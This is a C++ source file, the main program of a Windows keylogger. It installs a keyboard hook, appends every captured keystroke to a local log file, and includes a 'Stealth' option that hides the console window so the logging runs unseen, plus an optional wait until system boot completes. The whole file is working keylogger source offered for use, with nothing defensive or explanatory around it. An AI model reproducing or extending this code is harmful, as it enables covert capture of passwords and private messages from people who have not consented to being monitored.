#include "keylogger.h"
#include <fstream>
#include <iostream>
#include <sstream>
#include <map>
#include <thread>

//////////////////////////////////////////////////////////////////////////
// BELOW IS AN EXAMPLE.

volatile bool g_shouldQuit = false;

void Stealth()
{
#ifdef visible
	ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 5); // visible window
#endif

#ifdef invisible
	ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 0); // invisible window
	FreeConsole(); // Detaches the process from the console window. This effectively hides the console window and fixes the broken invisible define.
#endif
}

// Function to check if the system is still booting up
bool IsSystemBooting()
{
	return GetSystemMetrics(SM_SYSTEMDOCKED) != 0;
}

int CALLBACK Fwrite(const char* record, void* user) {
	std::ofstream* output_file = (std::ofstream*)user;
	*output_file << record;
	output_file->flush();
	std::cout << record;
	return 0;
}

BOOL WINAPI ConsoleEventHandler(DWORD eventType)
{
	switch (eventType)
	{
	case CTRL_C_EVENT:
	case CTRL_CLOSE_EVENT:
		g_shouldQuit = true;
		return TRUE;

	default:
		return FALSE;
	}
}

int main()
{
	// Unable to set `SetConsoleCtrlHandler`.
	if (!SetConsoleCtrlHandler(ConsoleEventHandler, TRUE))
	{
		return -1;
	}

	// Call the visibility of window function.
	Stealth(); 
	
	// Check if the system is still booting up
	#ifdef bootwait // If defined at the top of this file, wait for boot metrics.
	while (IsSystemBooting()) 
	{
		std::cout << "System is still booting up. Waiting 10 seconds to check again...\n";
		Sleep(10000); // Wait for 10 seconds before checking again
	}
	#endif
	#ifdef nowait // If defined at the top of this file, do not wait for boot metrics.
		std::cout << "Skipping boot metrics check.\n";
	#endif
	// This part of the program is reached once the system has 
	// finished booting up aka when the while loop is broken 
	// with the correct returned value.
	
	// Open the output file in append mode.
	// Feel free to rename this output file. 
	const char* output_filename = "keylogger.log";
	std::cout << "Logging output to " << output_filename << std::endl;
	std::ofstream output_file;
	output_file.open(output_filename, std::ios_base::app);

	// Call the hook function and set the hook.
	if (!SetHook(Fwrite, &output_file)) {
		LPCWSTR a = L"Failed to install hook!";
		LPCWSTR b = L"Error";
		MessageBox(NULL, a, b, MB_ICONERROR);
	}

	// We need a loop to keep the console application running.
	MSG msg;
	while (!g_shouldQuit)
	{
		while (PeekMessage(&msg, NULL, 0, 0, PM_REMOVE));
		std::this_thread::sleep_for(std::chrono::milliseconds(20));
	}
	output_file.close();
	ReleaseHook();
	return 0xDEAD;
}
